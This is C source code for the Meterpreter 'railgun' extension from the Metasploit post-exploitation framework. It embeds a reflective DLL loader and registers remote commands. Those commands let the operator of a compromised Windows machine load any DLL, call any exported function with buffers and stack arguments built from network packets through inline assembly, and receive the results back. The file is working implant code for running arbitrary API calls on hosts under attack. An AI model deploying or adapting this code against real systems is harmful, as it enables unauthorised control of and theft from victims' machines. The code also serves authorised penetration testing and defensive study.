/*
# Copyright (c) 2010, patrickHVE@googlemail.com
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions are met:
#     * Redistributions of source code must retain the above copyright
#       notice, this list of conditions and the following disclaimer.
#     * Redistributions in binary form must reproduce the above copyright
#       notice, this list of conditions and the following disclaimer in the
#       documentation and/or other materials provided with the distribution.
#     * The names of the author may not be used to endorse or promote products
#       derived from this software without specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
# ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
# WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
# DISCLAIMED. IN NO EVENT SHALL patrickHVE@googlemail.com BE LIABLE FOR ANY
# DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
# (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
# LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
# ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
# (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
# SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/

#define _CRT_SECURE_NO_DEPRECATE 1

#include "../../common/common.h"

#include "railgun.h"

#include "../../ReflectiveDLLInjection/DelayLoadMetSrv.h"
// include the Reflectiveloader() function, we end up linking back to the metsrv.dll's Init function
// but this doesnt matter as we wont ever call DLL_METASPLOIT_ATTACH as that is only used by the 
// second stage reflective dll inject payload and not the metsrv itself when it loads extensions.
#include "../../ReflectiveDLLInjection/ReflectiveLoader.c"

// this sets the delay load hook function, see DelayLoadMetSrv.h
EnableDelayLoadMetSrv();

HANDLE hMgr;
DWORD hErr;

// Gives me a copy of a data item of type TLV_META_TYPE_RAW
// caller has to free() it.
// returns NULL on fail
BYTE * getRawDataCopy(Packet *packet,TlvType type, DWORD * size){
	Tlv tlv;
	BYTE * bufferCopy;
	if (packet_get_tlv(packet, type, &tlv) != ERROR_SUCCESS){
		dprintf("getRawDataCopy: packet_get_tlv failed");
		*size = 0;
		return NULL;
	}
	*size = tlv.header.length;
	bufferCopy = (BYTE *)malloc(*size);
	memcpy(bufferCopy,tlv.buffer,*size);
	return bufferCopy;
}

// Gives me a copy of a data item of type TLV_META_TYPE_RAW
// caller has to free() it.
// returns NULL on fail
BYTE * getRawDataCopyFromGroup(Packet *packet, Tlv *group, TlvType type, DWORD * size){
	Tlv tlv;
	BYTE * bufferCopy;

	if( packet_get_tlv_group_entry(packet, group, type, &tlv) != ERROR_SUCCESS ) {
		dprintf("getRawDataCopyFromGroup: packet_get_tlv failed");
		*size = 0;
		return NULL;
	}

	*size = tlv.header.length;
	bufferCopy = (BYTE *)malloc(*size);
	memcpy(bufferCopy,tlv.buffer,*size);
	return bufferCopy;
}


// Multi-request railgun API
DWORD request_railgun_api_multi(Remote *remote, Packet *packet)
{
	DWORD bufferSizeOUT,bufferSizeIN,bufferSizeINOUT,stackSizeInElements;
	BYTE * bufferIN=NULL;
	BYTE * bufferOUT=NULL;
	BYTE * bufferINOUT=NULL;
	DWORD * stack = NULL;
	DWORD returnValue; // returnValue of the function
	const DWORD * stackDescriptorBuffer; // do not free! Just convenience ptr to TLV
	Tlv stackDescriptorTlv;
	const char * dllName;
	const char * funcName;
	HMODULE hDll;
	void * funcAddr;
	DWORD ii;
	DWORD lastError;
	Packet *response = packet_create_response(packet);
	DWORD result = ERROR_SUCCESS;
	Tlv reqTlv;
	Tlv tmpTlv;
	DWORD index = 0;
	Tlv   tlvs[4];

	dprintf("request_railgun_api_multi() processing %d elements (%d | %d)", TLV_TYPE_RAILGUN_MULTI_GROUP, packet->header.type, packet->header.length);

	while ( packet_enum_tlv(packet, index++, TLV_TYPE_RAILGUN_MULTI_GROUP, &reqTlv) == ERROR_SUCCESS ) {
		dprintf("request_railgun_api_multi(%d)", index);

		// Prepare the OUT-Buffer (undefined content)
		if( packet_get_tlv_group_entry(packet, &reqTlv, TLV_TYPE_RAILGUN_SIZE_OUT, &tmpTlv) != ERROR_SUCCESS ) {
			dprintf("request_railgun_api: Could not get TLV_TYPE_RAILGUN_SIZE_OUT");
			goto cleanup;
		}


		bufferSizeOUT = ntohl(*(LPDWORD)tmpTlv.buffer);
		dprintf("bufferSizeOUT == %d",bufferSizeOUT);
		if (bufferSizeOUT != 0){
			bufferOUT = (BYTE *)malloc(bufferSizeOUT);
			memset(bufferOUT,'A',bufferSizeOUT); // this might help catch bugs
		}
		dprintf("bufferOUT @ 0x%08X",bufferOUT);

		// get the IN-Buffer
		dprintf("Getting TLV_TYPE_RAILGUN_BUFFERBLOB_IN");
		bufferIN = getRawDataCopyFromGroup(packet, &reqTlv, TLV_TYPE_RAILGUN_BUFFERBLOB_IN, &bufferSizeIN);
		dprintf("bufferIN @ 0x%08X",bufferIN);
		if (bufferIN == NULL){
			dprintf("request_railgun_api: Could not get TLV_TYPE_RAILGUN_BUFFERBLOB_IN");
			goto cleanup;
		}
		dprintf("got TLV_TYPE_RAILGUN_BUFFERBLOB_IN, size %d",bufferSizeIN);

		// get the INOUT-Buffer
		dprintf("Getting TLV_TYPE_RAILGUN_BUFFERBLOB_INOUT");
		bufferINOUT = getRawDataCopyFromGroup(packet, &reqTlv, TLV_TYPE_RAILGUN_BUFFERBLOB_INOUT, &bufferSizeINOUT);
		dprintf("bufferINOUT @ 0x%08X",bufferINOUT);
		if (bufferINOUT == NULL){
			dprintf("request_railgun_api: Could not get TLV_TYPE_RAILGUN_BUFFERBLOB_INOUT");
			goto cleanup;
		}
		dprintf("got TLV_TYPE_RAILGUN_BUFFERBLOB_INOUT, size %d",bufferSizeINOUT);

		// Get DLLNAME
		if( packet_get_tlv_group_entry(packet, &reqTlv, TLV_TYPE_RAILGUN_DLLNAME, &tmpTlv) != ERROR_SUCCESS ) {
			dprintf("request_railgun_api: Could not get TLV_TYPE_RAILGUN_DLLNAME");
			goto cleanup;
		}
		dllName = (PCHAR)tmpTlv.buffer;
		if (dllName == NULL){
			dprintf("request_railgun_api: Could not get TLV_TYPE_RAILGUN_DLLNAME");
			goto cleanup;
		}
		dprintf("TLV_TYPE_RAILGUN_DLLNAME. %s: ",dllName);

		// Get funcNAME
		if( packet_get_tlv_group_entry(packet, &reqTlv, TLV_TYPE_RAILGUN_FUNCNAME, &tmpTlv) != ERROR_SUCCESS ) {
			dprintf("request_railgun_api: Could not get TLV_TYPE_RAILGUN_FUNCNAME");
			goto cleanup;
		}
		funcName = (PCHAR)tmpTlv.buffer;
		if (funcName == NULL){
			dprintf("request_railgun_api: Could not get TLV_TYPE_RAILGUN_FUNCNAME");
			goto cleanup;
		}
		dprintf("TLV_TYPE_RAILGUN_FUNCNAME. %s: ",funcName);

		// get address of function
		hDll = LoadLibraryA(dllName); // yes this increases the counter. lib should never be released. maybe the user just did a WSAStartup etc.
		if (hDll == NULL){
			dprintf("LoadLibraryA() failed");
			goto cleanup;
		}
		funcAddr = (void*)GetProcAddress(hDll,funcName);
		if (funcAddr == NULL){
			dprintf("GetProcAddress() failed");
			goto cleanup;
		}

		// get the Stack-description (1 DWORD description, 1 DWORD data)
		dprintf("Getting TLV_TYPE_RAILGUN_STACKBLOB");
		if( packet_get_tlv_group_entry(packet, &reqTlv, TLV_TYPE_RAILGUN_STACKBLOB, &stackDescriptorTlv) != ERROR_SUCCESS ) {
			dprintf("packet_get_tlv_group_entry failed");
			goto cleanup;
		}
		dprintf("Got TLV_TYPE_RAILGUN_STACKBLOB, size %d",stackDescriptorTlv.header.length);
		if ((stackDescriptorTlv.header.length % (2*sizeof(DWORD))) != 0){
			dprintf("TLV_TYPE_RAILGUN_STACKBLOB: blob size makes no sense");
		}
		dprintf("Function at 0x%08X.",funcAddr);


		stackSizeInElements = stackDescriptorTlv.header.length / (2*sizeof(DWORD));
		stackDescriptorBuffer = (DWORD*) stackDescriptorTlv.buffer;
		stack = (DWORD*) malloc((stackSizeInElements)*sizeof(DWORD));
		dprintf("Stack blob size: 0x%X",stackDescriptorTlv.header.length);
		dprintf("stackSizeInElements: %d",stackSizeInElements);
		dprintf("stack @ 0x%08X",stack);

		// To build the stack we have to process the items.
		// depending on their types the items are
		// 0 - literal values
		// 1 = relative pointers to bufferIN. Must be converted to absolute pointers
		// 2 = relative pointers to bufferOUT. Must be converted to absolute pointers
		// 3 = relative pointers to bufferINOUT. Must be converted to absolute pointers
		for (ii=0; ii<stackSizeInElements; ii++){
			DWORD itemType,item;
			itemType = stackDescriptorBuffer[ii*2];
			item = stackDescriptorBuffer[ii*2+1];
			switch(itemType){
				case 0:	// do nothing. item is a literal value
						dprintf("Param %d is literal:0x%08X.",ii,item);
						stack[ii] = item;
						break;
				case 1:	// relative ptr to bufferIN. Convert to absolute Ptr
						stack[ii] = item + ((DWORD)bufferIN);
						dprintf("Param %d is relative to bufferIn: 0x%08X => 0x%08X",ii,item,stack[ii]);
						break;
				case 2:	// relative ptr to bufferOUT. Convert to absolute Ptr
						stack[ii] = item + ((DWORD)bufferOUT);
						dprintf("Param %d is relative to bufferOUT: 0x%08X => 0x%08X",ii,item,stack[ii]);
						break;
				case 3:	// relative ptr to bufferINOUT. Convert to absolute Ptr
						stack[ii] = item + ((DWORD)bufferINOUT);
						dprintf("Param %d is relative to bufferINOUT: 0x%08X => 0x%08X",ii,item,stack[ii]);
						break;
				default:
					dprintf("Invalid stack item description %d for item %d",itemType,ii);
					goto cleanup;
			}
		}

		dprintf("calling function..");
		SetLastError(0);
		// written for readability. 
		// The compiler MUST use EBP to reference variables, sinde  we are messing with ESP.
		// In MSVC parlance "Omit Frame pointers" OFF!
		__asm{	
			pusha
			// save ESP
			mov EBX,ESP

			//"push" all params on the stack
			mov ECX,[stackSizeInElements]
			mov ESI,[stack]
			sub ESP,ECX  
			sub ESP,ECX  
			sub ESP,ECX  
			sub ESP,ECX  
			mov EDI,ESP
			cld
			rep movsd
			//and call!
			mov eax,[funcAddr]
			call eax
			// restore stack. no matter the calling convention
			mov esp,ebx // starting here we can use vars again
			mov [returnValue],EAX
			popa
		}
		lastError = GetLastError(); //must be called immediately after function

		dprintf("called function => %d",lastError);
		
		// time to ship stuff back
		tlvs[0].header.length = sizeof(DWORD);
		tlvs[0].header.type   = TLV_TYPE_RAILGUN_BACK_ERR;
		tlvs[0].buffer        = (PUCHAR)&lastError;
		tlvs[1].header.length = sizeof(DWORD);
		tlvs[1].header.type   = TLV_TYPE_RAILGUN_BACK_RET;
		tlvs[1].buffer        = (PUCHAR)&returnValue;
		tlvs[2].header.length = bufferSizeOUT;
		tlvs[2].header.type   = TLV_TYPE_RAILGUN_BACK_BUFFERBLOB_OUT;
		tlvs[2].buffer        = (PUCHAR)bufferOUT;
		tlvs[3].header.length = bufferSizeINOUT;
		tlvs[3].header.type   = TLV_TYPE_RAILGUN_BACK_BUFFERBLOB_INOUT;
		tlvs[3].buffer        = (PUCHAR)bufferINOUT;

		packet_add_tlv_group(response, TLV_TYPE_RAILGUN_MULTI_GROUP, tlvs, 4);
		dprintf("added stuff");

	cleanup: // todo: transmit error message on failure
		dprintf("request_railgun_api: cleanup");
		if (bufferIN != NULL) {free(bufferIN);}
		if (bufferOUT != NULL) {free(bufferOUT);}
		if (bufferINOUT != NULL) {free(bufferINOUT);}
		if (stack != NULL) {free(stack);}
	}

	packet_transmit_response(ERROR_SUCCESS, remote, response);
	dprintf("transmitted back");
	return 0;
}

// Single-request railgun API
DWORD request_railgun_api(Remote *remote, Packet *packet)
{
	DWORD bufferSizeOUT,bufferSizeIN,bufferSizeINOUT,stackSizeInElements;
	BYTE * bufferIN=NULL;
	BYTE * bufferOUT=NULL;
	BYTE * bufferINOUT=NULL;
	DWORD * stack = NULL;
	DWORD returnValue; // returnValue of the function
	const DWORD * stackDescriptorBuffer; // do not free! Just convenience ptr to TLV
	Tlv stackDescriptorTlv;
	const char * dllName;
	const char * funcName;
	HMODULE hDll;
	void * funcAddr;
	DWORD ii;
	DWORD lastError;
	Packet *response;

	dprintf("request_railgun_api()");

	// Prepare the OUT-Buffer (undefined content)
	bufferSizeOUT = packet_get_tlv_value_uint(packet, TLV_TYPE_RAILGUN_SIZE_OUT);
	dprintf("bufferSizeOUT == %d",bufferSizeOUT);
	if (bufferSizeOUT != 0){
		bufferOUT = (BYTE *)malloc(bufferSizeOUT);
		memset(bufferOUT,'A',bufferSizeOUT); // this might help catch bugs
	}
	dprintf("bufferOUT @ 0x%08X",bufferOUT);


	// get the IN-Buffer
	dprintf("Getting TLV_TYPE_RAILGUN_BUFFERBLOB_IN");
	bufferIN = getRawDataCopy(packet,TLV_TYPE_RAILGUN_BUFFERBLOB_IN,&bufferSizeIN);
	dprintf("bufferIN @ 0x%08X",bufferIN);
	if (bufferIN == NULL){
		dprintf("request_railgun_api: Could not get TLV_TYPE_RAILGUN_BUFFERBLOB_IN");
		goto cleanup;
	}
	dprintf("got TLV_TYPE_RAILGUN_BUFFERBLOB_IN, size %d",bufferSizeIN);

	// get the INOUT-Buffer
	dprintf("Getting TLV_TYPE_RAILGUN_BUFFERBLOB_INOUT");
	bufferINOUT = getRawDataCopy(packet,TLV_TYPE_RAILGUN_BUFFERBLOB_INOUT,&bufferSizeINOUT);
	dprintf("bufferINOUT @ 0x%08X",bufferINOUT);
	if (bufferINOUT == NULL){
		dprintf("request_railgun_api: Could not get TLV_TYPE_RAILGUN_BUFFERBLOB_INOUT");
		goto cleanup;
	}
	dprintf("got TLV_TYPE_RAILGUN_BUFFERBLOB_INOUT, size %d",bufferSizeINOUT);

	// Get DLLNAME
	dllName = packet_get_tlv_value_string(packet,TLV_TYPE_RAILGUN_DLLNAME);
	if (dllName == NULL){
		dprintf("request_railgun_api: Could not get TLV_TYPE_RAILGUN_DLLNAME");
		goto cleanup;
	}
	dprintf("TLV_TYPE_RAILGUN_DLLNAME. %s: ",dllName);
	// Get funcNAME
	funcName = packet_get_tlv_value_string(packet,TLV_TYPE_RAILGUN_FUNCNAME);
	if (funcName == NULL){
		dprintf("request_railgun_api: Could not get TLV_TYPE_RAILGUN_FUNCNAME");
		goto cleanup;
	}
	dprintf("TLV_TYPE_RAILGUN_FUNCNAME. %s: ",funcName);

	// get address of function
	hDll = LoadLibraryA(dllName); // yes this increases the counter. lib should never be released. maybe the user just did a WSAStartup etc.
	if (hDll == NULL){
		dprintf("LoadLibraryA() failed");
		goto cleanup;
	}
	funcAddr = (void*)GetProcAddress(hDll,funcName);
	if (funcAddr == NULL){
		dprintf("GetProcAddress() failed");
		goto cleanup;
	}

	// get the Stack-description (1 DWORD description, 1 DWORD data)
	dprintf("Getting TLV_TYPE_RAILGUN_STACKBLOB");
	if (packet_get_tlv(packet, TLV_TYPE_RAILGUN_STACKBLOB, &stackDescriptorTlv) != ERROR_SUCCESS){
		dprintf("packet_get_tlv failed");
		goto cleanup;
	}
	dprintf("Got TLV_TYPE_RAILGUN_STACKBLOB, size %d",stackDescriptorTlv.header.length);
	if ((stackDescriptorTlv.header.length % (2*sizeof(DWORD))) != 0){
		dprintf("TLV_TYPE_RAILGUN_STACKBLOB: blob size makes no sense");
	}
	dprintf("Function at 0x%08X.",funcAddr);


	stackSizeInElements = stackDescriptorTlv.header.length / (2*sizeof(DWORD));
	stackDescriptorBuffer = (DWORD*) stackDescriptorTlv.buffer;
	stack = (DWORD*) malloc((stackSizeInElements)*sizeof(DWORD));
	dprintf("Stack blob size: 0x%X",stackDescriptorTlv.header.length);
	dprintf("stackSizeInElements: %d",stackSizeInElements);
	dprintf("stack @ 0x%08X",stack);

	// To build the stack we have to process the items.
	// depending on their types the items are
	// 0 - literal values
	// 1 = relative pointers to bufferIN. Must be converted to absolute pointers
	// 2 = relative pointers to bufferOUT. Must be converted to absolute pointers
	// 3 = relative pointers to bufferINOUT. Must be converted to absolute pointers
	for (ii=0; ii<stackSizeInElements; ii++){
		DWORD itemType,item;
		itemType = stackDescriptorBuffer[ii*2];
		item = stackDescriptorBuffer[ii*2+1];
		switch(itemType){
			case 0:	// do nothing. item is a literal value
					dprintf("Param %d is literal:0x%08X.",ii,item);
					stack[ii] = item;
					break;
			case 1:	// relative ptr to bufferIN. Convert to absolute Ptr
					stack[ii] = item + ((DWORD)bufferIN);
					dprintf("Param %d is relative to bufferIn: 0x%08X => 0x%08X",ii,item,stack[ii]);
					break;
			case 2:	// relative ptr to bufferOUT. Convert to absolute Ptr
					stack[ii] = item + ((DWORD)bufferOUT);
					dprintf("Param %d is relative to bufferOUT: 0x%08X => 0x%08X",ii,item,stack[ii]);
					break;
			case 3:	// relative ptr to bufferINOUT. Convert to absolute Ptr
					stack[ii] = item + ((DWORD)bufferINOUT);
					dprintf("Param %d is relative to bufferINOUT: 0x%08X => 0x%08X",ii,item,stack[ii]);
					break;
			default:
				dprintf("Invalid stack item description %d for item %d",itemType,ii);
				goto cleanup;
		}
	}

	dprintf("calling function..");
	SetLastError(0);
	// written for readability. 
	// The compiler MUST use EBP to reference variables, sinde  we are messing with ESP.
	// In MSVC parlance "Omit Frame pointers" OFF!
	__asm{	
		pusha
		// save ESP
		mov EBX,ESP

		//"push" all params on the stack
		mov ECX,[stackSizeInElements]
		mov ESI,[stack]
		sub ESP,ECX  
		sub ESP,ECX  
		sub ESP,ECX  
		sub ESP,ECX  
		mov EDI,ESP
		cld
		rep movsd
		//and call!
		mov eax,[funcAddr]
		call eax
		// restore stack. no matter the calling convention
		mov esp,ebx // starting here we can use vars again
		mov [returnValue],EAX
		popa
	}
	lastError = GetLastError(); //must be called immediately after function

	dprintf("called function => %d",lastError);
	
	// time to ship stuff back
	response = packet_create_response(packet);
	dprintf("created return packet");
	packet_add_tlv_uint(response, TLV_TYPE_RAILGUN_BACK_ERR,lastError);
	packet_add_tlv_uint(response, TLV_TYPE_RAILGUN_BACK_RET, returnValue);
	packet_add_tlv_raw(response, TLV_TYPE_RAILGUN_BACK_BUFFERBLOB_OUT,bufferOUT,bufferSizeOUT);
	packet_add_tlv_raw(response, TLV_TYPE_RAILGUN_BACK_BUFFERBLOB_INOUT,bufferINOUT,bufferSizeINOUT);
	dprintf("added stuff");
	packet_transmit_response(ERROR_SUCCESS, remote, response);
	dprintf("transmitted back");

cleanup: // todo: transmit error message on failure
	dprintf("request_railgun_api: cleanup");
	if (bufferIN != NULL) {free(bufferIN);}
	if (bufferOUT != NULL) {free(bufferOUT);}
	if (bufferINOUT != NULL) {free(bufferINOUT);}
	if (stack != NULL) {free(stack);}
	return 0;
}

Command customCommands[] =
{
	{ "railgun_api",
	  { request_railgun_api,                                    { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},
	{ "railgun_api_multi",
	  { request_railgun_api_multi,                              { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},
	// Terminator
	{ NULL,
	  { EMPTY_DISPATCH_HANDLER                      },
	  { EMPTY_DISPATCH_HANDLER                      },
	},
};

/*
 * Initialize the server extension
 */
DWORD __declspec(dllexport) InitServerExtension(Remote *remote)
{
	DWORD index;
	dprintf("InitServerExtension");

	hMetSrv = remote->hMetSrv;

	for (index = 0;
	     customCommands[index].method;
	     index++)
		command_register(&customCommands[index]);

	return ERROR_SUCCESS;
}

/*
 * Deinitialize the server extension
 */
DWORD __declspec(dllexport) DeinitServerExtension(Remote *remote)
{
	DWORD index;
	dprintf("DeinitServerExtension");

	for (index = 0;
	     customCommands[index].method;
	     index++)
		command_deregister(&customCommands[index]);

	return ERROR_SUCCESS;
}
